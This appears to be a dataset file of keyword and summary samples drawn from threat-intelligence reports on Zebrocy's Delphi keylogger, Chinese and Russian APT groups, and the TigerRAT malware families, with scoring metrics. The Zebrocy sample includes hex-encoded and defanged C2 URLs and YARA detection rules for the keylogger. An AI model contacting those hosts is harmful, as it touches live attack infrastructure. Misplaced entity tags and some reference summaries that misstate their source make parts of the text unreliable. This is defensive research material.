Symbol names , function signatures and create structs for [ORG] Delphi classes . This plugin extracts and applies the [ORG] Delphi symbols from the IDC file , which is generated by [ORG] IDR , and attempts to find cases where [PERSON] Ghidra has incorrectly determined the entry point of a function . If you \u2019ve never imported a plugin to [PERSON] Ghidra please read this post . I \u2019ve saved the IDC to a selected folder . I then install the plugin in [PERSON] Ghidra and run the script it prompts for the IDC file and then load it!6/11In the wininition binary , the [ORDINAL] first function [ORG] WinMain has [NORP] SetWindowsHookExW function , which is a hook procedure to monitor a system for certain types of events . The hook procedures low - level keyboard input events is [ORG] WH_KEYBOARD_LL , which is the number [CARDINAL] 13 in the parameter . This hook is a mechanism that intercepts keystroke events . All the events are then saved to a log file to be sent to a C2.7/11The C2 is obfuscated using hex that can be converted to [ORG] ascii:68747470733A2F2F7777772E786268702E636F6D2F646F6D696E61726772656174617369616E6F64797hxxps://www.xbhp[.]com / dominargreatasianodyssey / wp- content / plugins / akismet / style.php68747470733A2F2F7777772E63346373612E6F72672F696E636C756465732F736F75726365732F66656hxxps://www.c4csa[.]org / includes / sources / felims.phpNote : These appear to be compromised domains . ConclusionAnalysis of these documents led us to find other Zebrocy clusters . As [PERSON] Zebrocy continues to evolve its scope , organizations must have the proper visibilities and detection capabilities to find this threat actor . We hope the techniques discussed in this post will be useful to other researchers in analyzing [PERSON] Delphocy dropper docs in particular , and documents with password - protected macros in general.8/11Indicators of [ORG] CompromiseWord DocumentsSHA256 content / plugins / akismet / style.php hxxps://www.c4csa[.]org / includes / sources / felims.phpYara Rules9/11rule apt_RU_delphocy_encStrings { meta : desc = \" Hex strings in [PERSON] Delphocy drops \" author = \" JAG - S @ SentinelLabs \" version = \" [CARDINAL] 1.0 \" TLP = \" White \" last_modified = \" [DATE] 04.09.2021 \" $ enc_keylogger2 = \" 5B4241434B53504143455D \" ascii wide $ [MONEY] enc_keylogger3 = \" 5B5441425D \" ascii wide $ [PERSON] enc_keylogger4 = \" 5B53484946545D \" ascii wide $ [PERSON] enc_keylogger5 = \" [CARDINAL] 5B434F4E54524F4C5D \" ascii wide $ enc_keylogger6 = \" 5B4553434150455D \" ascii wide $ [MONEY] enc_keylogger7 = \" [CARDINAL] 5B454E445D \" ascii wide $ enc_keylogger8 = \" [CARDINAL] 5B484F4D455D \" ascii wide $ [PERSON] enc_keylogger9 = \" 5B4C4546545D \" ascii wide $ [MONEY] enc_keylogger10 = \" 5B55505D \" ascii wide $ [MONEY] enc_keylogger11 = \" 5B52494748545D \" ascii wide $ [MONEY] enc_keylogger12 = \" [CARDINAL] 5B444F574E5D \" ascii wide $ [MONEY] enc_keylogger13 = \" 5B434150534C4F434B5D \" ascii wide $ cnc1 = \" [CARDINAL] 68747470733A2F2F7777772E786268702E636F6D2F646F6D696E61726772656174617369616E6F6479ascii wide $ cnc2 = \" [CARDINAL] 68747470733A2F2F7777772E63346373612E6F72672F696E636C756465732F736F75726365732F6665ascii widecondition : uint16(0 ) = = [CARDINAL] 0x5a4d and ( any of ( $ cnc * ) or all of ( $ enc_keylogger*))}10/11rule apt_RU_Delphocy_Maldocs { meta : desc = \" Delphocy dropper docs \" author = \" JAG - S @ SentinelLabs \" version = \" [CARDINAL] 1.0 \" TLP = \" White \" last_modified = \" [DATE] 04.09.2021 \" $ required1 = \" _ [GPE] VBA_PROJECT \" ascii wide $ required2 = \" Normal.dotm \" ascii wide $ required3 = \" bin.base64 \" ascii wide $ required4 = \" ADODB.Stream$ \" ascii wide $ [MONEY] author1 = \" [PERSON] Dinara [PERSON] Tanmurzina \" ascii wide $ author2 = \" Hewlett - Packard [ORG] Company \" ascii wide $ specific = \" Caption = \\\"\\\\wininition.exe\\ \" \" ascii wide $ builder1 = \" Begin { C62A69F0 - 16DC-11CE-9E98 - 00AA00574A4F } UserForm1 \" asciiwide$builder2 = \" { 02330CFE-305D-431C-93AC-29735EB37575}{33D6B9D9 - 9757 - 485A-89F4 - 4F27E5959B10 } \" ascii wide$builder3 = \" VersionCompatible32=\\\"393222000\\ \" \" ascii wide $ builder4 = \" CMG=\\\"1517B95BC9F7CDF7CDF3D1F3D1\\ \" \" ascii wide $ builder5 = \" DPB=\\\"ADAF01C301461E461EB9E2471E616F01D06093C59A7C4D30F64A51BDEDDA98EC1590C9B191FFascii wide $ builder6 = \" GC=\\\"4547E96B19021A021A02\\ \" \" ascii widecondition : uint32(0 ) = = [CARDINAL] 0xE011CFD0 and all of ( $ required * ) and ( all of ( $ author * ) or$specific or [CARDINAL] 5 of ( $ builder * ) ) } apt [PERSON] Macros [PERSON] Sophacy11/11", "generated_text": "Zebrocy; Kazakhstan; Russian; Fossacy; FancyBear; APT28; the documents; Delphi; XOR; The dropper; PE; a Malware; Delphi macros; an x; a dropper; the malware; DPB; IDR; IDC; Ghidra; techniques; the Zebrocy cluster; IOCs; YARA detection rules; the groups; DLL; 2018; compromise; techniques; a former Soviet Republic; Kazakhstan; the region; a cluster; Ukraine; the past; the election hacks; 2016; tactics; analysis; a cluster; YARA rules; a list; IOCs; YARA detection rules; threat hunters.", "ref_text": "<START-1>The PDF analyzes recent malware documents used by the APT group Zebrocy to target organizations in Kazakhstan. Zebrocy is a subgroup of the Sofacy cyberespionage group. - Six Word documents purporting to be from a Kazakh company contained VBA macros that drop malware. Two were likely real spearphishing documents. - The VBA macros were password-protected, but could be reversed to find base64 encoded malware. This decoded to a Delphi executable called wininition. - Wininition contains keylogging functionality that logs keystrokes to be sent to a command and control server. The C2 URLs were obfuscated with hex encoding. - The researcher demonstrates how to decompile the malware using Interactive Delphi Reconstructor (IDR) and import the results into Ghidra using the dhrake plugin. This reconstructions Delphi symbol names and class structures. - Analysis revealed additional related Zebrocy activity, suggesting the group is actively targeting Central Asia. Indicators of compromise and YARA rules are provided to help detect this threat. - The report highlights techniques to analyze Zebrocy's malware documents, which use Evade macros and Delphi malware. Ongoing research is required to counter this adaptable subgroup as part of the formidable Sofacy APT. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.3661016949152542, "gpt3/lexical/rouge_rouge2": 0.040955631399317405, "gpt3/lexical/rouge_rougeL": 0.17627118644067793, "gpt3/lexical/rouge_rougeLsum": 0.17627118644067793, "gpt3_generated_text": ["The article delves into the tactics and analysis of the Zebrocy subgroup of the Russian APT threat actor, Sofacy, which targets governments, military, and private organizations primarily in former Soviet Republics and recently in Asia. The article focuses on a cluster of activities targeting Kazakhstan with Delphocy, a malware written in Delphi and previously associated with Zebrocy, and provides techniques for analysts to reverse engineer Delphocy dropper docs, including bypassing password-protected macros. The analysis led to the discovery of further Zebrocy clusters, and the article provides a list of IOCs and YARA detection rules to enable threat hunters to search for these and related artifacts in their environments."]}, {"split_name": "val", "sample_id": "val_2", "prompt_text": "Extract the keywords: PANDAS AND [ORG] BEARSIncident response and security breach investigations experienceVice President , [ORG] CrowdStrike [ORG] Services Managing Director , Mandiant Special Agent , [ORG] Air [ORG] Force [ORG] Office [ORG] of [ORG] Special [ORG] InvestigationsLINKEDIN : [PERSON] Wendi [PERSON] WhitmoreTWITTER : @WendiLou2wwhitmor@us.ibm.comPARTNER , [ORG] IBM [ORG] SECURITY SERVICESConducting security assessment , incident response , insider threat analysis , and security architecture . Defended networks for [ORG] the [ORG] Defense [ORG] Industrial [ORG] BaseLINKEDIN : [PERSON] Christopher ScottTWITTER : @NetOpsGuruchris@crowdstrike.comDIRECTOR OF REMEDIATIONComment Panda : Commercial , Government , Non - profitDeep Panda : Financial , Technology , Non - profitFoxy [ORG] Panda : [ORG] Technology [ORG] & [ORG] CommunicationsAnchor Panda : Government organizations , [ORG] Defense [ORG] & [ORG] Aerospace , [ORG] Industrial [ORG] Engineering , NGOsImpersonating Panda : Financial SectorKarma Panda : Dissident groupsKeyhole [ORG] Panda : [ORG] Electronics [ORG] & CommunicationsPoisonous Panda : [ORG] Energy [ORG] Technology , [GPE] G20 , NGOs , Dissident [PERSON] GroupsPutter [PERSON] Panda : [ORG] Governmental [ORG] & [ORG] MilitaryToxic [ORG] Panda : Dissident GroupsUnion Panda : Industrial companiesVixen Panda : [PERSON] GovernmentSinging [PERSON] Spider : Commercial , FinancialUnion Spider : [PERSON] ManufacturingAndromeda [PERSON] Spider : [ORG] NumerousEnergetic Bear : [ORG] Oil [ORG] and [ORG] Gas [ORG] CompaniesMagic [ORG] Kitten : DissidentsCutting Kitten : Energy CompaniesViceroy Tiger : Government , Legal , [ORG] Financial , [ORG] Media , TelecomSilent Chollima : Government , [GPE] Military , [PRODUCT] FinancialDeadeye [PRODUCT] Jackal : Commercial , Financial , [GPE] Media , Social NetworkingGhost Jackal : Commercial , Energy , FinancialCorsair Jackal : Commercial , Technology , Financial , EnergyExtreme Jackal : Military , [ORG] GovernmentRemove affected machine from network immediatelyCollect data from [CARDINAL] one machine at a timeTrack attackers and actively hunt for them in real - timeSearch for indicators of attackBegin posturing for remediation on [DATE] Day [DATE] 1 of IRContain the adversary quicklyLong Long AgoNot So Long AgoTodayAutomation!Search for indicators of compromiseClean entire network before beginning to remediateConduct forensics for [DATE] months before containment of the adversary6IOCsMALWARESIGNATURESIOCsEXPLOITSVSIOAsPROCESS FLOWACTION VS [PERSON] MALWARE [PERSON] LATERAL MOVEMENTIOAsVULNERABILITIESIP ADDRESSESWe need a shift in detection capabilities from indicators of compromise toIndicators of [ORG] AttackForces attackers to change behaviorsNot all behaviors change - good intel and pattern analysis can identify the new TTPsAnalysts need the ability to tailor intel and extract relevance via tools and skillsetsUnderstanding your adversaries helps you gain focus and understand what intel is relevant12TTPs are now rapidly changingSome things must still remainWhat are adversaries adjusting to?Better intelligenceHiding from forensicsBetter analystsBetter technologyHow many adversaries are attacking you?BEARPANDASuccessful spear - phish inJan [CARDINAL] 2015Complete set of tools for lateral movement copied to network and executedAttackers identified as \u201c living off the land \u201d and largely using tools readily available on the systemForensic analysis identifieslateral movement and malware created BEFORE spear - phishToolset attributed to [GPE] China ; use went back [DATE] several [DATE] years , but recently inactiveTTPs point to [GPE] Russia ; earliest activity occurred [DATE] Jan [DATE] 2015Two attacker profiles emergeToolset # [MONEY] 1 : - Sloppy coding - Compile time and debug info intact - [NORP] Chinese character set information present Attribution : Eloquent PandaToolset # 2 : - Professional and sanitized code - Use of valid digital signatures - Attempts to frustrate reverse engineering Attribution : [PERSON] Cozy [PERSON] BearComplete set of tools for lateral movement copied to network and executedAttackers identified as \u201c living off the land \u201d largely using tools readily available on the systemToolset attributed to [GPE] China ; use went back [DATE] several [DATE] years , but recently inactiveTTPs point to [GPE] Russia ; earliest activity occurred Jan 2015Toolset # 1 : - Sloppy coding - Compile time and debug info intact - [NORP] Chinese character set information present Attribution : Eloquent PandaToolset # 2 : - Professional and sanitized code - Use of valid digital signatures - Attempts to frustrate reverse engineering Attribution : [ORG] Cozy [ORG] BearMultiple [ORG] Adversaries?Multiple [ORG] Locations \u2013 Franchise ExpansionDifferent POS Software and [ORG] VendorsDifferent [ORG] Support [ORG] VendorsDifferent [ORG] Concerns on [ORG] SecurityHunting and [ORG] RespondingUnderstand the EnvironmentDo You Have Access to the Endpoint?This is not a technical question ; -)Do You Have Tools to Respond?This is a technical questionMultiple [NORP] Adversaries?Plans to purchaseWhat adversaries would be interested?Understand the negotiation plansHunting and RespondingDo you have access in multiple environments?Law firm?Other company?Targeted hunting on people key to [ORG] the [ORG] M [ORG] & [ORG] A \u2026 and their [ORG] assistants\u2022 Why would you care ? \u2013 Understand who is targeting your intellectual property \u2013 Plan to spend your security budget better \u2013 Employ more effective containment and mitigation [ORG] strategies\u2022 What areas of the kill chain is the adversary targeting?\u2022 Where is the weakness?\u2022 What would better help you identify ? \u2013 Context of [ORG] the [ORG] incident\u2022 [ORG] M [ORG] & [ORG] A , [ORG] Franchises , Development [NORP] Plans \u2013 [ORG] Malware tools used \u2013 Sequencing of commands \u2013 Known C2 channels\u2022 Why ? \u2013 Intellectual property leaving the building during the attack \u2013 What makes you unique is quickly being taken \u2013 Containment is not \u201c Remediation\u201d\u2022 How ? \u2013 Visibility , Visibility , Visibility \u2013 Isolate in real time \u2013 New technologies allow for this \u2013 Look at the IOAs\u2022 Where in the attack cycle?\u2022 When ? \u2013 As soon as possible \u2013 Before forensics is complete ? YES . Are you crazy ? No.22THE TAKEAWAYSNot every adversary group is created equal . [ORG] Groups have differing skills , resources , and capabilities . Do not fit data into your expectations \u2013 Look for anomalies in your findings focusing on timing , behavior , and tradecraftThe likelihood of being targeted by multiple adversaries is high . In this example , remediation had to include both actors simultaneously!\u2022 All Adversaries \u2013 Privileged Account Control\u2022 Think outside of the box on ways to do this \u2013 Blacklisting known IOCs?\u2022 What is the effort vs the reward ? \u2013 Service Accounts\u2022 Can you reset them?\u2022 Who has the source code?\u2022 How long to fix it?\u2022 Where is the adversary in the kill chain?\u2022 The earlier in the kill chain , the more options at your disposal . \u2013 Visibility , Visibility , Visibilty \u2013 If you can find them at : exploitation , installation , command and control\u2022 You can stop them quickly \u2013 If you understand the pattern of the attack you have additional options\u2022 Anticipate the next move\u2022 Use the intel you collected26", "generated_text": "CrowdStrike Services; Mandiant; Air Force Office of Special Investigations; Defended networks; the Defense Industrial Base; Panda; financial institutions; Karma Panda; Dissident groups; Putter Panda; industries; energy; NGOs; The Pandas; cyberattacks; Malware; metadata; Activity; a shift; detection capabilities; indicators; attack; behaviors; lateral movement; malware; tools; Russia; November 2015; Indicators; the new TTPs; Indicators; the use; experts; techniques; a shift; the tools; insight.", "ref_text": "<START-1>The PDF discusses tactics, techniques, and procedures (TTPs) used by various Chinese and Russian cyber threat actors to compromise networks, as well as recommendations for defending against and responding to such intrusions. It provides an overview of different Chinese threat actor groups, their targeting sectors, and group names - for example, Deep Panda targets financial, technology, and non-profit organizations. It also covers Russian groups like Energetic Bear which targets oil/gas companies. The document emphasizes the importance of shifting detection from indicators of compromise (IOCs) like IP addresses to indicators of attack (IOAs) like malicious behaviors and process flows. IOAs are more effective since attacker TTPs are rapidly changing while some core behaviors remain constant. Understanding your adversaries helps focus intelligence gathering and analysis. A case study highlights how multiple adversary groups can concurrently compromise a network. Forensic analysis revealed two separate toolsets, attributed to Elegant Panda and Cozy Bear. The need for visibility, rapid containment, and assuming multiple adversaries are present is emphasized. Key mitigation takeaways include controlling privileged accounts, resetting service accounts, blacklisting IOCs selectively, and striving to detect intruders early in the attack chain via visibility and behavioral analytics. The earlier an intruder is detected, the more options a defender has to respond and contain the threat. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": NaN, "gpt3/lexical/rouge_rouge2": NaN, "gpt3/lexical/rouge_rougeL": NaN, "gpt3/lexical/rouge_rougeLsum": NaN, "gpt3_generated_text": []}, {"split_name": "val", "sample_id": "val_3", "prompt_text": "Extract the keywords: ESTABLISHING THE TIGERRAT AND TIGERDOWNLOADER MALWARE FAMILIESAuthor : Markel Picado OrtizDecember 2021TABLE OF CONTENTSEXECUTIVE SUMMARYINTRODUCTIONPACKER ANALYSISMALWARE FAMILIES AND VARIANTSTIGERDOWNLOADER VARIANTSTIGERRAT VARIANTSCONCLUSIONSAPPENDIXABOUT THREATRAY346111417212230ESTABLISHING THE TIGERRAT AND TIGERDOWNLOADER MALWARE FAMILIES2EXECUTIVE [NORP] SUMMARYRecent research by [GPE] Malwarebytes ( [DATE] April [DATE] 2021 ) , [PERSON] Kaspersky ( [DATE] June [DATE] 2021 ) and [ORG] the [ORG] Korean [ORG] CERT ( [DATE] September [DATE] 2021 ) , reports about attacks on [NORP] South [NORP] Korean entities , employing new techniques and malware not previously identified . The initial report by [GPE] Malwarebytes attributes the attack to the [ORG] Lazarus group . [PERSON] Kaspersky refines the attribution to [ORG] the [ORG] Andariel [ORG] APT , a subgroup of [ORG] Lazarus . [PERSON] Korea [PERSON] CERT ( [ORG] KrCERT ) reports a new attack and calls the malware tools seen in this attack [ORG] TigerDownloader and TigerRAT . The [PERSON] KrCERT report provides a thorough and detailed , indicator - based analysis of the relationship between their malware samples and those previously analyzed by [ORG] Kaspersky and [GPE] Malwarebytes . They also employ a proprietary attribution technology to further relate the attacks . In this report , we focus on the malware tooling from the previously reported attacks . We provide new evidence to attribute these tools to the same downloader and RAT families . We will refer to these families as [ORG] TigerDownloader and TigerRAT respectively . We 've chosen these names in recognition of [ORG] KrCERT 's important work where the names were [ORDINAL] first introduced to refer to the malware tools they studied in that same work . We systematically study code reuse as well as functional commonalities between all the samples used in different stages of the previously reported attacks ( i.e. , packers , downloaders , and [ORG] RAT payloads ) . We have also found that while the tools fall into the mentioned families , there are different variants of the tools which have been deployed in the reported attacks . For the [ORG] RAT payloads , we have found [CARDINAL] three versions with distinct capabilities . For the downloaders we have found [CARDINAL] two versions , one with and the other without persistence capabilities . Apart from these findings , we contribute novel insights and speculations to the existing body of knowledge toward a clearer mapping of the techniques and tools used by this threat actor . Finally , we are making our unpacking and config extraction scripts as well as raw data available to the community ( url to facilitate further research and defense capabilities . ESTABLISHING THE TIGERRAT AND TIGERDOWNLOADER MALWARE FAMILIES3INTRODUCTION WHAT IS [ORG] THE [ORG] ANDARIEL [ORG] APT [ORG] GROUP ? [ORG] Andariel group is a state - sponsored threat actor . It is a subgroup of the [ORG] Lazarus cybercrime group , considered one of the most sophisticated [NORP] North [NORP] Korean threat actors to which threat researchers have attributed many attacks from [DATE] 2009 [DATE] to [DATE] 2021 . The [ORG] Andariel group is mostly targeting [NORP] South [NORP] Korean entities focusing mainly on financial gain and cyber espionage . This group is known to employ custom tools and new techniques to increase the effectiveness of its attacks . [DATE] April 19 , [DATE] 2021 : [GPE] Malwarebytes has reported a recent attack targeting [GPE] South [GPE] Korea using a malicious Word document . The [GPE] Malwarebytes report describes the attack and attributes it to the [ORG] Lazarus group . [GPE] Malwarebytes discovered a novel downloader component used in the attack . - url within - bmp - file - to - drop - its - rat/ [DATE] June [DATE] 15 , [DATE] 2021 : [PERSON] Kaspersky released a blog post about the same attack , mentioning the [GPE] Malwarebytes report , saying they detected the Word document in [DATE] April . [PERSON] Kaspersky refines the attribution to the [ORG] Andariel [ORG] APT group , a subgroup of [ORG] Lazarus . Kaspersky \u2019s analysis is based on operational similarities found between the current and past attacks of the [ORG] Andariel [ORG] APT group . They also identify novel downloaders and [ORG] RAT payloads . In addition , they find a new ransomware deployed by the [ORG] RAT . \u2013 url ransomware/102811/ [DATE] September , [DATE] 2021 : [PERSON] KrCERT reports on an operation they call \" ByteTiger \" , a campaign targeting [NORP] South [NORP] Korean entities which they have attributed to the [ORG] Andariel [ORG] APT group . This report analyses in detail a multistage attack with [CARDINAL] two unknown pieces of code which they call [ORG] TigerDownloader and TigerRAT . They link the new attack to the samples previously disclosed by [GPE] Malwarebytes and [PERSON] Kaspersky using some proprietary tooling . Linkage is apparently done through similarities / re - use of code , rich headers , section hashes and C2 infrastructure , yet no further details are shared in the report . url THE TIGERRAT AND TIGERDOWNLOADER MALWARE FAMILIES4The attack chains in all the reported cases have some structural similarities ( see Figure [CARDINAL] 1 ) . In all [CARDINAL] three reports a downloader malware has been observed . [PERSON] Kaspersky and [ORG] KrCERT have additionally seen a [ORDINAL] third - stage [ORG] RAT components . Concerning the access methods , malicious documents have been used in the cases reported by [GPE] Malwarebytes and [PERSON] Kaspersky , whereas a compromised website was used in the [ORG] KrCERT case . Figure [CARDINAL] 1 : Similarities and differences between the attack chains reported by [GPE] Malwarebytes , [PERSON] Kaspersky and KrCERT.ESTABLISHING THE TIGERRAT AND TIGERDOWNLOADER MALWARE FAMILIES5PACKER ANALYSIS In this section we will [ORDINAL] first establish that the packed binaries share common code that originates from the unpacking algorithm . Then we show that there is a common packing scheme underlying all the packed samples at our disposal . Our findings thus provide strong evidence that the binaries are related by the same packer . Should the packer be under exclusive control of the attacker ( which we do n\u2019t know ) then our findings would allow attribution of all the binaries to the same actor . SHARED CODE IN PACKED SAMPLES To quickly understand if the packed samples are related , we performed an automated code reuse analysis at the function level . The results forming that analysis are shown in Figure [CARDINAL] 2 . In the table , the numbers in the \u201c function reuse \u201d column measure the number of samples in which a function occurs . As an example , the function at the address 0x140002b70 ( [ORDINAL] first row ) appears in [CARDINAL] 27 out of [CARDINAL] 27 the packed samples . That is , this is a function that occurs in all packed samples . Figure [CARDINAL] 2 : Function reuse across the [CARDINAL] 27 packed binaries which we have analyzed . ESTABLISHING THE TIGERRAT AND TIGERDOWNLOADER MALWARE FAMILIES6There are several other functions ( i.e. , [PERSON] 0x140001bf0 , [GPE] 0x140002030 , [PERSON] 0x140002860 ) that appear in [CARDINAL] 27 or [CARDINAL] 26 samples . From the table , we can establish that the packed samples are clearly related . All of them have [CARDINAL] two functions in common and there are various subsets of the samples that feature substantial code reuse . In a nutshell , the automated function reuse analysis gives us a quick understanding about the relations of the packed samples . As we shall see next , it also directs our manual analysis efforts . Based on the analysis , we suspected that the samples share a few functions for the effective unpacking , while some of the remaining functions are used to avoid detections by antivirus , [PERSON] Yara and related pattern - based detection technologies . We then took a closer look at these stable functions and could confirm that they do , indeed , contain packing functionality . The results of this analysis are shown in Figure [CARDINAL] 3.Packed hashFunction addressFunction reuseFunctionality0996a8e5ec1a41645309 [QUANTITY] 140002b700996a8e5ec1a41645309 [QUANTITY] 140001bf00996a8e5ec1a41645309 [QUANTITY] 1400020300996a8e5ec1a41645309 [QUANTITY] 1400028600996a8e5ec1a41645309 [QUANTITY] 1400023600996a8e5ec1a41645309 140002a30(27/27)(27/27)(26/27)(26/27)(12/27)(14/27)map_decrypted_payload()anti_analysis_check()do_unpacking()dynamic_winapi_resolution()main_program()relocate_mapped_payload()Figure [CARDINAL] 3 : [ORG] Functionality found in the most stable functions . We could also confirm the presence of junk code to avoid detection technologies . Figure [CARDINAL] 4 shows the same function decrypt_payload ( ) in [CARDINAL] two different samples . We can see junk functions like GetFontUnicodeRanges ( ) , [PERSON] GetSysColorBrush ( ) and CreateBitMap ( ) which are called but whose return values are not being used . In the figure , the effective unpacking code , which in this case is the XOR decryption algorithm , is contained within the green boxes shown . We have found this junk - code strategy in all the packed code and throughout many functions . ESTABLISHING THE TIGERRAT AND TIGERDOWNLOADER MALWARE FAMILIES7Figure [CARDINAL] 4 : Junk code in packer code to avoid anti - virus and [PERSON] Yara detections . In summary , we have seen so far that the packed samples are related by a common packer code . The code - wise differences between the packed samples is mainly due to the presence of junk code . COMMON PACKING SCHEME The packer is a simple loader , which decrypts and maps the payload into memory . The decryption scheme is a simple [WORK_OF_ART] XOR using a [QUANTITY] 16 - byte key . This has been established in previous research . Additionally , we found that all packer variants follow the same common packing scheme , whereas the variants of the scheme are determined by [CARDINAL] two parameters . [CARDINAL] One parameter is whether or not the packed payload is [PERSON] Base64 encoded , the other is where the packed payload is stored within a [ORG] PE file . The variations concerning encoding of the payload are illustrated in Figure [CARDINAL] 5.ESTABLISHING THE TIGERRAT AND TIGERDOWNLOADER MALWARE FAMILIES8Figure [CARDINAL] 5 : Above , [PERSON] Base64 encoding of encrypted payload ; below , encrypted payload without encoding . Concerning the location of the packed code , we have observed that there are [CARDINAL] three locations within a [ORG] PE file where the packed payload is stored . The locations are depicted in Figure [CARDINAL] 6.Figure [CARDINAL] 6 : Variations of packed code locations in a [ORG] PE file . Left to right , packed code in [ORG] PE overlay , in the [ORG] PEresource section , or in a dedicated PE section which is named OTC in this example . ESTABLISHING THE TIGERRAT AND TIGERDOWNLOADER MALWARE FAMILIES9For the [ORDINAL] third variant using a dedicated section , we observed the following section names : \u201c [ORG] KDATA , \u201d \" OTC , \u201d \u201c [ORG] OTS , \u201d \u201c OTT , \u201d and \u201c data . \u201d We could not identify the significance , if any , underlying these names . Our findings are summarized in Figure [CARDINAL] 7 , which shows the packing scheme common to all packed downloader and RAT variants we analyzed . Figure [CARDINAL] 7 : Packing scheme common to all samples . ESTABLISHING THE TIGERRAT AND TIGERDOWNLOADER MALWARE FAMILIES10MALWARE FAMILIES AND VARIANTS In this section , we will establish through code reuse analysis that all the unpacked binaries fall into a downloader or RAT family . We are calling these families the [ORG] TigerDownloader and TigerRAT malware family . These names were introduced in the [ORG] KrCERT report to refer to the downloader and [ORG] RAT components in their investigation . To get a quick understanding of the unpacked binaries , we have performed a combined cluster and code - reuse analysis . This analysis allows us to automatically identify malware families and malware variants within a family . The goal of this analysis is to gain a quick understanding of the relationship between binaries and to direct analysts to the relevant samples for further manual analysis to eventually understand the attacker \u2019s tooling and capabilities . The results of the cluster and code - reuse analysis are shown in Figure [CARDINAL] 8 . The figure confirms that the unpacked binaries either fall into the [ORG] TigerDownloader ( blue ) or TigerRAT ( orange ) family . Moreover , we see that each family has [CARDINAL] three variants ( shown as large circles ) . We have used a cluster threshold of 97.5 % , meaning that binaries which are [PERCENT] at [PERCENT] least 97.5 % similar fall into the same cluster . The clusters in the graph consist of the so - called \u201c cluster representatives \u201d ( large circles ) and samples ( small circles ) directly connected to a cluster representative . The underlying idea is that the samples within a cluster are essentially identical and thus well represented by the cluster representative . Figure [CARDINAL] 8 : Cluster and code - reuse analysis of the unpacked samples with their abbreviated hashes . We note that the choice of the cluster threshold has an obvious impact on the variants : A high threshold will reveal minor and more variants , while a low one reveals fewer and only major variants . We draw the following conclusions from the graphs:\u2022 There is no code reuse between the [ORG] TigerDownloader and the TigerRAT family . We recall from the packer analysis that although the families are code - wise distinct , they are packed using the same packing scheme . ESTABLISHING THE TIGERRAT AND TIGERDOWNLOADER MALWARE FAMILIES11\u2022 Within the downloader family , there are [CARDINAL] three variants : [CARDINAL] one x86 and [CARDINAL] two x64 variants . The [CARDINAL] two x64 variants are very closely related ( i.e. , 97 % code reuse ) and thus are likely variants with minor differences.\u2022 Within the [ORG] RAT family , we have a similar situation with [CARDINAL] three variants : [CARDINAL] one x86 and [CARDINAL] two x64 . However , the [CARDINAL] two x64 variants only share 55 % of their code and thus seem to be substantial RAT variants . The relations between the x64 and x86 binaries are lower , which is expected due to compiler and CPU architecture differences , but relevant code reuse can still be found . The table in Figure [CARDINAL] 9 shows the detailed composition of the clusters from the previous graphs . We also notice that some ( hash - wise ) unique packed samples result in ( hash - wise ) identical unpacked sample , reducing the effective diversity of the samples under consideration . Figure [CARDINAL] 9 : Detailed cluster information . ESTABLISHING THE TIGERRAT AND TIGERDOWNLOADER MALWARE FAMILIES12In the following sections we will analyze the downloader and RAT variants in more detail , limiting our analysis to the cluster representatives . This ability to reduce analysis to cluster representatives is key for the directed and efficient analysis and tracking of malware variants . The choice of cluster representatives and their names used in the following analysis are shown in Figure [CARDINAL] 10 . ClusterSample NameStageHash012345RAT ( x64 ) [ORDINAL] 3rd stageRAT ( x64 ) [ORDINAL] 3rd stageRAT - Kaspersky- [ORDINAL] 3rd stageRAT - Kaspersky- ce300458136c03165d20915ee658067Figure [CARDINAL] 10 : Cluster representatives used in the subsequent analysis . ESTABLISHING THE TIGERRAT AND TIGERDOWNLOADER MALWARE FAMILIES13TIGERDOWNLOADER VARIANTS In this section , we take a closer look at the [CARDINAL] two downloader variants : Downloader - Malwarebytes - x64 and [PERSON] Downloader - [PERSON] Kaspersky - x64 . From the cluster and code reuse analysis ( see Figure 8) we know that they share 97 % of code and thus are minor variants of the [ORG] TigerDownloader family . Using the binary diffing capabilities of our analysis toolchain , we see in Figure [CARDINAL] 11 that the samples are largely made up of the same functions , except for one unique function ( the one with the address 0x140001230 ) in the Kaspersky ( Downloader - Kaspersky - x64 ) sample . Figure [CARDINAL] 11 : Function level diff between [PERSON] Downloader - [PERSON] Kaspersky - x64 and [PERSON] Downloader - [PERSON] Malwarebytes - x64.Analyzing the downloader sample from [PERSON] Kaspersky ( see Figure [CARDINAL] 12 ) , we see that the unknown function ( 0x140001230 ) is called from the main function of the downloader . Figure [CARDINAL] 12 : Left , [PERSON] Downloader - [PERSON] Kaspersky - x64 ; right , [NORP] Downloader - [NORP] Malwarebytes - x64.ESTABLISHING THE TIGERRAT AND TIGERDOWNLOADER MALWARE FAMILIES14It turns out that this function is used to achieve persistence . The technique being used is straightforward and consists of creating a link in the current user startup folder to make sure that the downloader is started upon reboot of a victim machine ( see Figures 13 and 14).Figure 13 : Function which creates a shortcut for persistence . Figure [CARDINAL] 14 : Shortcut to persistent executable . Finally , we note that we have n\u2019t found any persistence techniques in the Downloader - Malwarebytes- x64 sample . The reason is likely to minimize indicators being left on victim machines . ESTABLISHING THE TIGERRAT AND TIGERDOWNLOADER MALWARE FAMILIES15POSSIBLE CONNECTIONS TO THE KRCERT TIGERDOWNLOADER report is not available publicly , thus we could not include it into our analysis . To nevertheless examine possible relations between [ORG] KrCERT and the [PERSON] Malwarebytes and [PERSON] Kaspersky downloaders , we attempted to connect them purely based on the artifacts and behaviors publicly reported by [ORG] KrCERT . Let \u2019s start with a negative result . [ORG] KrCERT reports a couple of [CARDINAL] C2 commands which they have found in their downloader ( see Figure [CARDINAL] 15 ) . We could n\u2019t find any of the \u201c Tiger10X \u201d identifiers in the downloaders at our disposal . Neither were we able to find any other identifiers which could be possible [CARDINAL] C2 commands . IdentifierActionTiger101Tiger102Tiger103Send victim infoReceive commandFile uploadFigure [CARDINAL] 15 : TigerDownloader C2 commands reported by KrCERT.On the other hand , we have found various aspects reported by [ORG] KrCERT that are also present in the other downloaders:\u2022 The packer in the [ORG] KrCERT reports fits into the packer scheme which we have establishedabove.observed in our samples.\u2022 [PERSON] KrCERT reports that the communication is encoded using [PERSON] Base64 , which we have also\u2022 The [ORDINAL] 3rd stages ( RATs ) which are downloaded by the [ORDINAL] 2nd stages ( downloaders ) all belong tothe same TigerRAT family ( as we shall establish in the following section).In a nutshell , the observations above suggest that [ORG] the [ORG] KrCERT [ORG] Downloader might be related to the downloaders observed by [GPE] Malwarebytes and [PERSON] Kaspersky . However , this is speculative because we lack hard evidence since we do n\u2019t have access to the [ORG] KrCERT sample . ESTABLISHING THE TIGERRAT 